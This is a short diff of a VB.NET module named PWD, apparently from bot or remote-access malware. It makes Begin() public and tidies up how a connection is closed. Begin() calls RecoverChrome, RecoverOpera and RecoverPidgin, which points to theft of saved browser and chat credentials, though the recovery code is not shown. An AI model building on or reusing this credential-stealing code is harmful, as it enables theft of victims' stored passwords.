@@ -10,7 +10,7 @@ Module PWD
     Public HW = ID.Bot
 
 
-    Sub Begin()
+    Public Sub Begin()
         RecoverChrome()
         RecoverOpera()
         RecoverPidgin()
@@ -22,8 +22,7 @@ Module PWD
 
         Threading.Thread.CurrentThread.Sleep(10000)
         Try
-            Main.C.Close()
-            Main.C = Nothing
+            Main.CloseMe()
         Catch ex As Exception
         End Try
 
